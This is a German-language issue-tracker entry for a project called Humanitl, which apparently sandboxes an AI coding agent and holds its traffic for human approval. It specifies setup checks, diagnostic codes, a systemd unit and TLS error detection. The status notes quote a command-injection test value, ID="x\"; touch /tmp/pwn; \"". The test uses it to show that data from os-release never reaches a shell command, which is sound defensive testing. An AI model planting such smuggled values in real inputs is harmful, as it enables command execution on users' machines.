- `app/lib/core/ipc/daemon_client.dart`, `grpc_daemon_client.dart`, `fake_daemon_client.dart`: `doctor()` und `probeLlm(endpoint)` (beide fehlen; der Daemon implementiert `ProbeLlm` seit HUM-039)
- `daemon/crates/sandbox/src/doctor/checks.rs`: Die Maschinen-Hälfte hat HUM-075 vor diesem Issue gebaut (`doctor.rs` plus `doctor/{checks,probe}.rs`, alle Ergebnisse statt des ersten Fehlers, bei dem `BwrapBackend::detect` abbricht); hier kommen nur die distributionsspezifischen Befehle dazu. Eine eigene `preflight.rs` gibt es nicht und wird es nicht geben (nachgesehen am 2026-09-12: keine Datei `preflight*` im Baum)
- `daemon/crates/sandbox/src/os_release.rs` (neu), `daemon/crates/sandbox/tests/os_release.rs` (neu)
- `daemon/crates/ipc/src/server.rs`: `Doctor` implementieren (heute `unimplemented("Doctor", "HUM-075")`), `daemon/crates/ipc/tests/fake_parity.rs`
- `daemon/bin/humanitl/src/cmd/doctor.rs` (neu), `cli.rs`: `humanitl doctor [--json]` (ADR-018; die CLI-Hälfte fehlte in der ersten Fassung)
- `daemon/bin/humanitl/src/cmd/daemon.rs`, `cli.rs`: `daemon install` (heute nur `Status`)
- `daemon/crates/sandbox/src/bwrap.rs`: `INSTALL_COMMAND` (Konstante `"sudo apt install bubblewrap"`) wird zur Funktion über `/etc/os-release`
- `packaging/systemd/humanitld.service` (neu; das Verzeichnis hält nur `.gitkeep`)
- `daemon/crates/core-types/src/diagnostics/codes.rs`: `CONFIG_013` („Kein Projektordner gewählt") und `DAEMON_005..008` für die Unit-Datei von `daemon install` (geteilte Datei; anhängen), `docs/DIAGNOSTICS.md` neu erzeugen. Seccomp und `$XDG_RUNTIME_DIR` bekommen keine eigenen Nummern: Sie prüft der Doctor aus HUM-075 unter `DOCTOR_003` und `DOCTOR_004` (nachgesehen am 2026-09-12)
- ARB: `setup*` (camelCase)

### Spezifikation

Zustandsmodell:

```dart
enum CheckState { unknown, checking, ok, failed }
@freezed class SetupCheck { CheckKind kind; CheckState state; Diagnostic? diagnostic; String? detail; }
enum CheckKind { daemon, llm, project, sandbox }
```

Ablauf:

```
App start
  └─ daemon: connect UDS ──ok──> GetInfo ──version ok──> [daemon ok]        (connectionStateProvider, vorhanden)
        │ fail                      │ major mismatch
        ▼                           ▼
     DAEMON_001                  DAEMON_002
  └─ llm:  Sandbox(Status).llm_endpoint leer? ──ja──> DOCTOR_013 (Info: nicht angesprochen)
        └─ gesetzt ──> ProbeLlm ──ok──> [llm ok, models chip]   / fail ──> LLM_001..003, LLM_006, LLM_007
  └─ project: Sandbox(Status).work_dir gesetzt und Sandbox(Plan) ohne Blocking? ──nein──> CONFIG_0xx "kein Ordner" bzw. SANDBOX_005
  └─ sandbox: Doctor() ──> bwrap (SANDBOX_001), version ≥ 0.8 (SANDBOX_002), userns (SANDBOX_003),
        seccomp im Kernel (DOCTOR_003), $XDG_RUNTIME_DIR gesetzt und 0700 (DOCTOR_004), llm; agent preflight (AGENT_001..002)
All ok ──> "Start agent" enabled ──> Sandbox(Start) ──> Isolation checks (HUM-041) ──> Intercept screen
```

Endpoint, `work_dir`, `work_mode` und Profil kommen aus `Sandbox(Status)` (`Status.llm_endpoint`, `work_dir`, `work_mode`, `profile`; gefüllt in `daemon/crates/ipc/src/sandbox.rs`), nicht aus `GetConfig` — der ist unimplementiert, und `DaemonClient` hat keine Konfigurationsmethode. Das Auflösen von `.humanitl/profile.toml` entfällt aus diesem Issue; wo es später gezeigt wird, heißen die Befunde `CONFIG_003` und `CONFIG_007..009` (`CONFIG_004` ist „Laufzeitverzeichnis ist ein Ersatz").

Diagnostics dieses Issues (Register `codes.rs`; eine Nummer wird nie wiederverwendet):

| Code | Severity | why (en) | fix (genau **eine** `FixAction`; `Diagnostic.fix` ist `Option<FixAction>`, die Leitung ein `oneof`) |
|---|---|---|---|
| `DAEMON_001` | Error (so erzeugt der Client sie heute, `client_diagnostics.dart`) | "Humanitl's background service is not running. The app cannot see any traffic without it." | `InstallService`; der Befehl `systemctl --user start humanitld` steht im `why`, nicht als zweite Aktion |
| `DAEMON_002` | Blocking | "The service speaks protocol v{x}, this app expects v{y}. Update both from the same release." | `OpenUrl(releases)` — `FixControl` rendert das heute als Kopierknopf; wer wirklich öffnen will, nennt `url_launcher` als neue Abhängigkeit |
| `CONFIG_0xx` (frei ab 010) | Blocking | "No project folder chosen. The agent needs exactly one folder to work in." | kein `ChangeSetting` (verlangt einen `value` und einen Schreibweg); die Zeile öffnet den Ordner-Knopf |
| `SANDBOX_005` (vorhanden) | Blocking | „Projektordner nicht beschreibbar" | wie in `bwrap.rs` |
| `SANDBOX_001` | Blocking | "bubblewrap (bwrap) is not installed. It is the sandbox Humanitl runs the agent in." | `CopyCommand(<paketmanager> install bubblewrap)`, Distribution aus `/etc/os-release` (`ID`, `ID_LIKE`: apt / dnf / pacman / zypper, sonst apt) |
| `SANDBOX_002` | Blocking | "bwrap {found} is too old; 0.8.0 or newer is required for --file and seccomp." | wie oben |
| `SANDBOX_003` | Blocking | "Unprivileged user namespaces are disabled on this system. Rootless sandboxes need them." | `CopyCommand("sudo sysctl -w kernel.unprivileged_userns_clone=1")` bzw. AppArmor-Hinweis auf Ubuntu ≥ 23.10: `CopyCommand("sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0")` mit `docs` |
| `DOCTOR_003` (aus HUM-075, nicht neu) | Blocking | "The kernel has no seccomp filter support." | `docs` |
| `DOCTOR_004` (aus HUM-075, nicht neu) | Blocking | "$XDG_RUNTIME_DIR is not set or not writable; Humanitl keeps its sockets there." | `CopyCommand("loginctl enable-linger $USER")` |
| `DOCTOR_008`/`DOCTOR_013` (aus HUM-075, nicht neu) | Info | Sprachmodell nicht erreichbar bzw. gar nicht angesprochen | kein `ChangeSetting`, die Zeile zeigt das Feld |

`PROJECT_001`/`PROJECT_002` entfallen: es gibt keinen Bereich `PROJECT` in `AREAS`, und `codes_stay_inside_their_area` bricht mit „has no reserved area". `SANDBOX_004` („Isolation-Check fehlgeschlagen") und `SANDBOX_005` („Projektordner nicht beschreibbar") sind vergeben; deshalb sah die erste Fassung 017/018 vor. `LLM_000` liegt außerhalb des Bereichs `LLM` (001..009); 008 und 009 waren damals frei.

**Nachtrag 2026-09-12: die Codes dieses Issues heißen anders als die Tabelle oben.** Nachgesehen in `daemon/crates/core-types/src/diagnostics/codes.rs`: `SANDBOX_017` und `SANDBOX_018` wurden nie registriert, der Bereich springt von `SANDBOX_016` (Zeile 445) auf `SANDBOX_020` (Zeile 451), und 017 bis 019 sind frei. Seccomp und `$XDG_RUNTIME_DIR` prüft der Doctor, und die Befunde heißen seit HUM-075 `DOCTOR_003` (Zeile 991) und `DOCTOR_004` (Zeile 1000); HUM-075 wurde vor diesem Issue gebaut, deshalb brauchte es keine eigenen Nummern. Die LLM-Zeile nimmt ihre Info aus derselben Reihe (`DOCTOR_008`, `DOCTOR_013`); `LLM_008` hat danach HUM-076 mit der Bedeutung „Die Suche im Netz kann nicht stattfinden" belegt (Zeile 892). Aus diesem Issue stehen in `codes.rs`: `CONFIG_013` „Kein Projektordner gewählt" (Zeile 388) und `DAEMON_005..008` für die Unit-Datei von `daemon install` (Zeilen 245 bis 273).

`Doctor` ist der Preflight-RPC: `rpc Doctor(Empty) returns (DoctorReport)` mit `DoctorCheck { id, status, evidence, diagnostic }` und `CheckStatus { OK, WARN, FAIL }` steht in der Proto, und der Fake antwortet schon mit den fünf Kennungen `bwrap`, `userns`, `seccomp`, `runtime_dir`, `llm` (`fake/mod.rs`). Der echte Server liefert `unimplemented("Doctor", "HUM-075")`; HUM-075 erklärt „Blockiert: HUM-044" und muss deshalb vorher gebaut werden — oder seine Maschinen-Hälfte wird hier gebaut. Keine Proto-Änderung.

`daemon install` schreibt genau eine Unit, mit Platzhalter für den Pfad:

```ini
# ~/.config/systemd/user/humanitld.service
[Unit]
Description=Humanitl moderation daemon
[Service]
ExecStart={humanitld}            # aus std::env::current_exe() der CLI, gleiches Verzeichnis
Restart=on-failure
NoNewPrivileges=yes
ReadWritePaths=%h/.local/share/humanitl %h/.config/humanitl %t/humanitl
PrivateTmp=yes
RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6
SystemCallFilter=@system-service @mount
[Install]
WantedBy=default.target
```

Kein `ProtectHome=read-only`: der Daemon startet `bwrap` als eigenes Kind (`bwrap.rs::supervise`), `sandbox.work_mode` ist per Vorgabe `rw`, und `check_work_dir` lehnt einen nicht beschreibbaren Projektordner mit `SANDBOX_005` ab — mit `ProtectHome=read-only` wäre das jedes Projekt unter `$HOME`. `@system-service` trägt kein `@mount`; bubblewrap mountet und `pivot_root`s. Keine `humanitld.socket`: `listenfd`/`LISTEN_FDS` kommen im Baum nicht vor, und `free_socket()` in `humanitld` verbindet sich beim Start mit einem vorhandenen Socket und weigert sich mit `DAEMON_003`, wenn etwas antwortet — genau das täte ein von systemd gehaltener Socket. Socket-Aktivierung ist ein eigenes Issue mit Eintrag in `daemon/Cargo.toml` (Elternagent). Die Unit gegen ein Projekt unter `$HOME` testen, bevor die Härtung behauptet wird.

Screen-Layout: zentrierte Spalte, max. 640 px, Titel „Set up Humanitl", vier `SetupCheckRow` (Punkt, Titel, Detail/Diagnostic, Aktion rechts), darunter `HButton(variant: HButtonVariant.primary, …)` „Start agent" (es gibt keinen `HButton.primary`-Konstruktor). Zeilen: Daemon („Background service"), LLM („Your model server" mit Endpoint-Feld aus `core/ui`, ohne Probe je Tastendruck), Project („Project folder" mit dem Ordner-Knopf aus `core/ui`; die Profil-Auswahl entfällt, bis ein RPC Profile listet — heute kennt der Vertrag `profile` nur als String, `available_profiles` löst die CLI lokal auf, und `app/packages/ui` hat kein Select-Widget), Sandbox („Sandbox check" mit `Doctor`-Ergebnis). Der Daemon-Check pollt alle 2 s, solange er rot ist; das kehrt die bewusste Entscheidung in `connection.dart` („Reconnecting is explicit") für den roten Fall um und sagt es im Kommentar dort.

Modell-Chip: `ProbeLlmResponse.models` sind Namen, die ein unauthentifizierter Server im LAN wörtlich liefert; `ollama_models`/`openai_models` (`llm_probe.rs`) begrenzen weder Länge noch Anzahl, nur den Rumpf (1 MiB). Vor dem Chip: `sanitize_note` in `probe_result_to_proto` (`convert.rs`), Länge und Anzahl deckeln, `maxLines` wie in `agent_ask_card.dart`. Nie ein `CopyCommand` aus einem Modellnamen. `LLM_006` (nicht privat) und `LLM_007` (keine lesbare Adresse) zeigt die Zeile, nicht nur den grünen Fall.

Coach-Mark: Beim ersten `Held`-Flow einer Installation erscheint über der Aktionsleiste ein Popover mit `setupCoachFirstHold` en "Held because no rule matches (default: ask). Allow sends it unchanged; the response is recorded, not held. Use the arrow to remember a rule." de "Angehalten, weil keine Regel passt (Standard: ask). Senden schickt die Anfrage unverändert; die Antwort wird aufgezeichnet, nicht angehalten. Über den Pfeil kannst du eine Regel merken." Schließen per Klick oder `Esc`, danach nie wieder. Das Flag lebt in der App, bis ein Konfigurations-Schreibweg existiert: `UiConfig` hat genau `language`, `theme`, `notifications`, `sound` und `deny_unknown_fields`; ein `ui.coach_marks_seen` in `config.toml` wäre heute `CONFIG_001`.

### Schritte
1. Codes zuerst: `CONFIG_013` und `DAEMON_005..008` in `codes.rs` anhängen, `docs/DIAGNOSTICS.md` neu erzeugen. Seccomp und `$XDG_RUNTIME_DIR` bringen keine neuen Nummern mit; sie stehen als `DOCTOR_003` und `DOCTOR_004` aus HUM-075 schon dort.
2. Maschinen-Hälfte: entfällt, HUM-075 hat sie vor diesem Issue gebaut (`doctor.rs`, `doctor/checks.rs`, `doctor/probe.rs`, `Doctor` in `server.rs`, `fake_parity.rs`, `humanitl doctor [--json]` mit Exit 0 bei ok/warn und 3 bei fail). Hier bleibt der `/etc/os-release`-Leser mit Tabellentest über Fixture-Dateien und seine Anbindung in `doctor/checks.rs` und `bwrap.rs`.
3. `doctor()` und `probeLlm()` in `DaemonClient`, `GrpcDaemonClient`, `FakeDaemonClient` (geteilte Datei: neu lesen, anhängen).
4. Setup als Zustand in der Shell (`connection_gate.dart`, `shell_screen.dart`), Retry-Timer in `connection.dart`.
5. `setupProvider`: vier Checks parallel aus `connectionStateProvider`, `Sandbox(Status)`/`Sandbox(Plan)`, `ProbeLlm`, `Doctor`.
6. Geteilte Controls nach `core/ui`, Screen und Widgets, Coach-Mark in `features/intercept`, Popover in `app/packages/ui`.
7. `daemon install` mit einer Unit und `current_exe()`; `FixActionInstallService` in `fix_control.dart` ruft es und löst das Binary neben der laufenden Anwendung auf, nie aus `$PATH` oder einem Konfigurationswert.
8. ARB, Widget-Tests, Goldens (alle rot, alle grün).

### Tests
- `setup_shows_daemon_001_with_install_action` (FakeDaemonClient `unavailable()`).
- `start_button_enabled_only_when_all_ok`.
- `llm_row_uses_probe`, `llm_row_shows_llm_006_and_007`, `model_chip_is_clamped`.
- `coach_mark_shown_once`: erster Held ⇒ Popover; zweiter Held ⇒ kein Popover.
- `setup_keeps_header_and_ctrl_1_while_flows_are_held`.
- Daemon-Unit: `install_command_per_os_release` (`daemon/crates/sandbox/tests/os_release.rs:183`). Die Prüfergebnisse selbst misst HUM-075 in `daemon/crates/sandbox/tests/doctor.rs` (`a_healthy_machine_is_green_everywhere_and_says_what_it_measured`, `a_broken_machine_names_every_defect_with_a_way_out`, `the_report_of_a_machine_where_nothing_answers_is_still_eleven_lines`); die drei `preflight_*`-Namen der ersten Fassung gibt es nicht (nachgesehen am 2026-09-12).
- CLI: `daemon install` schreibt die Unit in ein temporäres `XDG_CONFIG_HOME`, `ExecStart` zeigt auf `current_exe()`-Nachbarn, keine Socket-Unit; `humanitl doctor --json` liefert fünf Zeilen.

### Akzeptanzkriterien
- [x] Frische Installation ohne laufenden Daemon: App zeigt Setup mit `DAEMON_001`, Klick auf Fix installiert und startet die Unit, Zeile wird binnen 4 s grün (durch den 2-s-Retry). **Die Verkettung ist am 2026-09-06 gemessen, und die Naht dafür ist gebaut.** Bis dahin hielt jede der vier Aussagen einzeln (`setup_shows_daemon_001_with_install_action`, `setup_offers_the_install_button_for_the_ordinary_daemon_001`, `install_service_runs_the_command_that_does_it`, `install_service_without_a_stand_in_runs_the_real_command`, `a stopped daemon is tried again every two seconds`), aber kein Test verband Klick und Rückkehr: `FixControl` nahm seinen Runner nur als Parameter, und der Anwendungsbaum reichte keinen durch. Jetzt liest `FixControl` ihn aus `serviceInstallerProvider`, wenn kein Parameter ihn setzt — dasselbe Muster wie `directoryChooserProvider` beim Projektordner —, und `the install button starts the daemon and the line turns green` (`app/test/features/setup/setup_test.dart`) fährt den ganzen Weg: Bildschirm des Aufbaus mit `DAEMON_001` und Knopf, Klick, der Installer stellt den Dienst an, und der Zwei-Sekunden-Versuch bringt die Shell zurück. Mutationsprobe: den Provider ignorieren und wieder fest `runInstallService` nehmen, Test rot.
- [x] Ohne bwrap: `SANDBOX_001` mit distributionsspezifischem Befehl, in der App wie in `humanitl doctor`.
- [x] Alle grün ⇒ Start ⇒ Intercept-Screen; der Ring im Header wird grün, sobald HUM-041 gelandet ist (bis dahin grau, `IsolationRingPlaceholder`).
- [x] Coach-Mark erscheint genau einmal.
- [x] Während des Setups zeigt der Header-Badge gehaltene Flows, und `Ctrl+1` wechselt.
- [x] Goldens abgelegt.

### Stand (2026-09-06): gemergt nach fünf Review-Runden und fünfzig bestätigten Defekten

Gemessen, nicht behauptet. Alle sechs Kriterien sind abgehakt, jedes gegen
einen benannten Test oder eine ausgeführte Messung (das erste seit dem
2026-09-06, siehe unten):

- **Distributionsspezifischer Befehl**: `daemon/crates/sandbox/src/os_release.rs`
  wählt aus vier fest einkompilierten Literalen über `ID` und `ID_LIKE`; kein
  Zeichen aus `/etc/os-release` erreicht den Befehl, und ein Test mit
  `ID="x\"; touch /tmp/pwn; \""` belegt das. `the_doctor_and_the_launcher_offer_the_same_install_command`
  hält die zweite Hälfte des Satzes: in der App wie in `humanitl doctor`.
- **Start führt in die Warteschlange**: `the queue opens only after the start
  really came up` und `a start that fails leaves the setup on the screen`. Der
  Ring ist echt und liest `sandboxStatusProvider`; der Platzhalter aus der
  ersten Fassung ist weg, seit HUM-041 gelandet ist.
- **Coach-Mark genau einmal**: `coach_mark_shown_once` fährt zwei Anwendungsstarts
  über denselben Speicher — das ist der Unterschied zwischen „einmal" und
  „einmal je Fenster" — und `a seen mark never appears`.
- **Kopf-Abzeichen und `Ctrl+1`**: gemessen mit drei wirklich gehaltenen Flüssen.
  Auf dem Setup-Abschnitt steht `3 held`, `Ctrl+1` wechselt nach Intercept, das
  Abzeichen bleibt.
- **Goldens**: sechs Bilder für drei Lagen in hell und dunkel.

**Nachtrag 2026-09-06: das erste Kriterium ist zu.** Es war keine fehlende
Fähigkeit, sondern eine fehlende Naht — `FixControl` nahm seinen Runner nur als
Parameter, und der Anwendungsbaum reichte keinen durch, also gab es keine
Stelle, an der ein Widget-Test Klick und Rückkehr verbinden konnte. Die Naht ist
jetzt ein Provider (`serviceInstallerProvider`, dasselbe Muster wie
`directoryChooserProvider`), und `the install button starts the daemon and the
line turns green` fährt den Weg in einem Lauf. Der Preis steht dabei: Wer
`FixControl` außerhalb der Anwendung baut, braucht einen `ProviderScope` um
seinen Wirt; die drei Test-Wirte, die keinen hatten, haben ihn bekommen.

**Was die fünf Runden gefunden haben**, weil die Form davon wiederkehrt: eine
Oberfläche, die richtig aussah und log — der eingefrorene Bildschirm war nicht
eingefroren, nur seine Uhr; eine Benachrichtigung konnte in ihn hineinentscheiden;
`Ctrl+1` bis `Ctrl+6` starben mit dem Fokus, also genau die Wege zurück zu einem
laufenden Daemon; und das Einfrieren war zugleich zu weit, denn es lähmte den
Bildschirm, der den Daemon installiert. Dazu zweimal wieder die alte Klasse: ein
Wert von außen, der ohne Beweis zu einem Befehl wird. Und dreimal ein
Mutationsbeweis, der nicht hielt — der Countdown stand wegen `TickerMode` still,
nicht wegen der Uhr, die der Test nannte.

Die letzten beiden Runden fanden ausschließlich Folgeschäden der jeweils
vorigen. Die fünfte Prüfung, eng auf diese vier Reparaturen und ihre Nachbarn
gerichtet, fand nichts mehr; das war die Abbruchbedingung.

**Nicht enthalten, benannt statt verschwiegen:** `AgentAdapter::preflight` wird
auf dem Daemon-Pfad weiterhin nicht gerufen (HUM-129, gemessen und abgelegt).
Zwei Dateien sind nach `core` gezogen, mit Weiterleitung am alten Pfad, damit in
diesem Commit kein Aufrufer umziehen musste; beide stehen in
`docs/ARCHITECTURE.md` 5.

### Stand (2026-09-04): Größe XL, neun genannte Codes, RPCs und Widgets gibt es nicht oder sie heißen anders, drei Kriterien enden in einem Schreibweg ohne Schreiber

Audit von 28 Agenten gegen den Code: 20 Widersprüche, 7 blockierend, oben im Text korrigiert. Vorhanden und nutzbar: `find_program`, `query_version`, `probe_user_namespaces` in `bwrap.rs` (drei der fünf Prüfungen; `detect()` bricht beim ersten Fehler ab), der Fake-`Doctor` mit den fünf Kennungen, `rpc Doctor` samt Nachrichten in der Proto, `probe_llm` im Server, `Sandbox(Status)` mit Endpoint, Ordner, Modus und Profil, der Platzhalter-`SetupScreen` mit `HDiagnosticCard` und `FixControl`, `connectionStateProvider` mit Heartbeat und `retry()`, alle sieben `FixAction`-Varianten in `fix_control.dart`, die Widget-Harness mit `unavailable()`/`incompatible()`/`goOffline()`. Ungebaut: `preflight.rs`, `Doctor` im echten Server, `humanitl doctor`, `daemon install`, `doctor()`/`probeLlm()` im Client, Setup in der Shell, Retry-Timer, Provider, vier Zeilen, geteilte Controls, Popover, Coach-Mark, `os-release`. Daher XL statt M.

**Blockierend in der ersten Fassung, jetzt korrigiert:**

- `SANDBOX_004` und `SANDBOX_005` mit neuer Bedeutung („kein seccomp", „`$XDG_RUNTIME_DIR`"): beide sind vergeben („Isolation-Check fehlgeschlagen", „Projektordner nicht beschreibbar", letzterer erzeugt in `bwrap.rs`). Jetzt `DOCTOR_003`/`DOCTOR_004` aus HUM-075; `SANDBOX_017`/`018` sind nie vergeben worden (Nachtrag 2026-09-12).
- `PROJECT_001`/`002`: kein Bereich `PROJECT` in `AREAS`, Test `codes_stay_inside_their_area` bricht. Entfallen; „kein Ordner" bekommt einen `CONFIG`-Code, „nicht benutzbar" ist `SANDBOX_005`.
- `LLM_000`: außerhalb des Bereichs. Jetzt `DOCTOR_008`/`DOCTOR_013` aus HUM-075; `LLM_008` trägt seit HUM-076 eine andere Bedeutung (Nachtrag 2026-09-12).
- LLM- und Projekt-Zeile lasen `config.llm.endpoint` und `config.sandbox.work_dir`: `GetConfig` ist unimplementiert, `DaemonClient` hat keine Konfigurationsmethode. Jetzt `Sandbox(Status)`.
- Drei Kriterien schrieben in `config.toml` (`ChangeSetting`, Endpoint-Feld, `ui.coach_marks_seen`): kein Schreibweg im Repository, `UiConfig` mit `deny_unknown_fields`. Gestrichen und in Nicht-Ziel benannt.
- Schritt 1 erfand `SandboxPreflight` als zweiten RPC: `Doctor` steht im Vertrag, der Fake antwortet, HUM-075 hält ihn und erklärt „Blockiert: HUM-044", stand aber hinter HUM-044 in der Reihenfolge. HUM-075 ist jetzt Abhängigkeit und rückt in der Tabelle davor.
- Weiter korrigiert: `DAEMON_001` mit zwei Fixes (die Leitung trägt einen); Socket-Unit ohne `LISTEN_FDS` (und `free_socket` verweigerte den Start); `ProtectHome=read-only` und `@system-service` ohne `@mount` blockierten die Sandbox; `ExecStart=%h/.local/bin/humanitld` gegen `current_exe()`; `WorkDirPicker` aus `features/sandbox` und Coach-Mark „über der Aktionsleiste" aus `features/setup` verstoßen gegen `check-deps.sh`; `LlmEndpointField` existiert nicht; Header-Badge und `Ctrl+1` sind im Setup unmöglich, solange `ConnectionGate` den Shell-Screen ersetzt; Profil-Dropdown ohne RPC; 2-s-Poll gegen die dokumentierte Entscheidung; `CONFIG_004` ist kein Profil-Befund; `HButton.primary`, `setup_coach_first_hold`, `OpenUrl` als Kopierknopf, `DAEMON_001` heute `Severity.error`; „Ring grün" hängt an HUM-041; „zweiter Tab" ist `Ctrl+4`; kein CLI-Subkommando genannt.

**Offen, hier nicht entschieden:** ob HUM-075 vorher gebaut oder seine Maschinen-Hälfte hierher gezogen wird; ob `OpenUrl` wirklich öffnet (`url_launcher`) oder Kopierknopf bleibt; ob `DAEMON_001` auf `Blocking` wechselt (`client_diagnostics.dart`).

**Seit dem Audit überholt:** HUM-040 ist gemerged; `work_dir_picker.dart` ist getrackt; der Ordnerwunsch reist in `Plan`/`Start` (CONVENTIONS 4.17), was diesem Issue den Schreibweg erspart.

**Aus dem Audit nicht bestätigt:** nichts Wesentliches; Zeilenanker in `client_diagnostics.dart` um eine Zeile verschoben.

**Feindliche Eingabe:** (1) die Modellliste aus dem LAN (siehe Spezifikation; Säuberung in `probe_result_to_proto`, Deckel, `maxLines`, nie `CopyCommand`); (2) das Projekt-Profil aus dem geklonten Repository — die Zeile darf einen `FixAction`, dessen Text auf Projekt-Ebene entstand, nie zu einem Klick machen, vor allem keinen `CopyCommand` und kein `ChangeSetting` für einen dort gesperrten Schlüssel; (3) der getippte Endpoint geht in DNS, bevor jemand entscheidet (`ProbeLlm` löst absichtlich außerhalb der Warteschlange auf) — keine Probe je Tastendruck, `LLM_006`/`LLM_007` sichtbar. Kleiner: `SANDBOX_003` bettet bwraps stderr wörtlich in `why` (`bwrap.rs`); klemmen wie alles andere.

### Fallstricke
- `systemctl --user` funktioniert nicht in Umgebungen ohne User-Session-Bus (SSH ohne Linger). `DOCTOR_004`/`DAEMON_001` decken das ab; Fix-Text nennt `loginctl enable-linger`.
- Ubuntu ≥ 23.10 blockiert unprivilegierte User-Namespaces per AppArmor; bwrap aus dem Paket hat ein AppArmor-Profil, das es erlaubt. Preflight prüft erst, ob `bwrap --unshare-user true` funktioniert, bevor es sysctl-Hinweise gibt.
- Der Daemon darf nie mit `sudo` installiert werden; die Fix-Befehle enthalten kein `sudo` für Humanitl selbst, nur für Paketinstallation.
- Setup-Screen darf gehaltene Flows nicht verstecken; deshalb Setup als Zustand in der Shell.
- `daemon/Cargo.toml` und `proto/humanitl/v1/humanitl.proto` bleiben unberührt; mit `Doctor` braucht dieses Issue keines von beiden.

### Referenzen
BACKLOG.md Abschnitt 5 (Usability §1, §6), 4.4 (systemd-Härtung), ADR-010, ADR-012, ADR-018; CONVENTIONS.md 3.4, 3.8, 4.6, 4.11, 4.17; `docs/ARCHITECTURE.md` 3b, 5; HUM-075. `systemd.exec(5)`, Flathub-Diskussion zu bwrap (https://discourse.flathub.org/t/help-with-running-bubblewrap-in-a-flatpak/3572).

---

## HUM-045 · TLS-Fehler-Erkennung
Sprint: 3 · Größe: S · Abhängigkeiten: HUM-014, HUM-015, HUM-063 · Blockiert: HUM-068

### Kontext
Nicht jedes Tool in der Sandbox vertraut der Humanitl-CA (Java ignoriert PEM-Env, alte Bun-Versionen, Go mit eigenem Pool). Das Symptom ist ein TLS-Fehler im Agenten-Terminal, der Nutzer starrt allein darauf. Usability §6: der Proxy sieht den Handshake-Abbruch und muss ihn als Karte mit Fix zeigen.

### Ziel
Der Proxy erkennt Client-seitige TLS-Abbrüche nach dem CONNECT (Alert `unknown_ca`/`bad_certificate` oder Verbindungsabbruch direkt nach dem `ServerHello`), ordnet sie einem Flow zu, und liefert ein `Diagnostic` `TLS_001..003` mit `FixAction::SetEnv`, dessen Vorschlag vom `User-Agent`-Hinweis abhängt, falls vorhanden.

### Nicht-Ziel
Keine automatische Injektion weiterer Env-Variablen zur Laufzeit. Keine Unterstützung von Certificate Pinning.

### Betroffene Pfade
- `daemon/crates/proxy/src/tls_observe.rs` (neu)
- `daemon/crates/proxy/src/flow.rs`: Verknüpfung CONNECT-Flow ↔ Handshake
- `app/lib/features/intercept/widgets/diagnostic_card.dart` (Nutzung, bereits aus HUM-063/HUM-020)

### Spezifikation

Erkennung: Für jeden CONNECT-Flow existiert nach `200 Connection established` die MITM-Phase. hudsucker übergibt den Handshake an rustls; Fehler kommen als `rustls::Error::AlertReceived(AlertDescription)` oder als `io::Error` (`UnexpectedEof`, `ConnectionReset`) vor Abschluss des Handshakes. `tls_observe.rs`:

```rust
pub enum TlsFailure { AlertUnknownCa, AlertBadCertificate, AlertOther(String), EofBeforeFinished, ResetBeforeFinished }
pub fn classify(err: &dyn std::error::Error) -> Option<TlsFailure>;
pub fn diagnostic_for(failure: &TlsFailure, host: &HostName, hint: ToolHint) -> Diagnostic;
pub enum ToolHint { Curl, Node, Bun, Python, Go, Java, Git, Cargo, Unknown }
pub fn tool_hint(connect_headers: &HeaderMap) -> ToolHint;   // from User-Agent of the CONNECT request, if present
```

Diagnostics:

| Code | Severity | Auslöser | why (en) | fix |
|---|---|---|---|---|
| `TLS_001` | Warning | `AlertUnknownCa` oder `AlertBadCertificate` | "{tool} inside the sandbox rejected Humanitl's certificate for {host}. The request never left the sandbox. Most tools read a CA file from an environment variable; this one did not." | `SetEnv` je Hint: Curl ⇒ `CURL_CA_BUNDLE=/etc/humanitl/ca.crt`; Node ⇒ `NODE_EXTRA_CA_CERTS=/etc/humanitl/ca.crt`; Bun ⇒ dasselbe plus Hinweis „Bun ≥ 1.1.22"; Python ⇒ `SSL_CERT_FILE` und `REQUESTS_CA_BUNDLE`; Go ⇒ `SSL_CERT_FILE`; Java ⇒ `JAVA_TOOL_OPTIONS=-Djavax.net.ssl.trustStore=/etc/humanitl/cacerts.jks` (Datei aus HUM-014); Git ⇒ `GIT_SSL_CAINFO`; Cargo ⇒ `CARGO_HTTP_CAINFO`; Unknown ⇒ `SSL_CERT_FILE` |
| `TLS_002` | Warning | `EofBeforeFinished`/`ResetBeforeFinished` dreimal in 10 s für denselben Host | "A client in the sandbox keeps dropping the TLS handshake to {host}. This usually means certificate pinning or a tool that ignores CA variables." | `docs`, `AddRule` (Vorschlag: `block` für den Host, damit der Agent schnell scheitert statt zu hängen) |
| `TLS_003` | Info | Handshake mit `ClientHello` ohne SNI | "A client connected without SNI; Humanitl cannot issue a certificate without a hostname and closed the connection." | keine |

Die `SetEnv`-Fix-Aktion wird in der UI als „Für nächste Session setzen" gerendert: schreibt in das Profil (global) unter `[sandbox.env]`. Zusätzlich „Befehl kopieren" mit `export KEY=VALUE` für die laufende Session (der Nutzer kann es im Terminal eingeben). Der Flow selbst erhält `Decided(Block { reason: BlockReason::NoRoute })`? Nein: der Flow bleibt beim CONNECT-Status; er wird als `Responded { status: 0 }` mit `error = "tls_handshake_failed"` aufgezeichnet, damit die History ihn zeigt (Zustandsfarbe `error`).

### Schritte
1. `classify`, `tool_hint`, `diagnostic_for` mit Tabelle.
2. hudsucker-Hook: Fehlerpfad des MITM-Handshakes abfangen (Handler `handle_error` oder Wrapper um den `TlsAcceptor`), Flow-ID aus dem CONNECT-Kontext.
3. Recorder: Flow-Abschluss mit `error`-Feld (Migration `V4__flow_error.sql`: `ALTER TABLE flows ADD COLUMN error TEXT`).
4. Zähler für `TLS_002` (pro Host, gleitendes Fenster 10 s).
5. UI: Diagnostic-Karte im Feed (kommt über `diagnosticsProvider`), Fix-Buttons.

### Tests
- `classify_unknown_ca`, `classify_eof`.
- `tool_hint_from_user_agent`: `curl/8.5` ⇒ Curl, `node` ⇒ Node, `Bun/1.1` ⇒ Bun, `python-requests` ⇒ Python, `Go-http-client` ⇒ Go, `Java/21` ⇒ Java, `git/2.4` ⇒ Git, leer ⇒ Unknown.
- Integration: Client mit leerem Trust-Store (rustls-Client ohne Root) macht CONNECT + Handshake ⇒ genau ein `TLS_001`, History zeigt Flow mit `error`.
- `tls_002_after_three_resets`.

### Akzeptanzkriterien
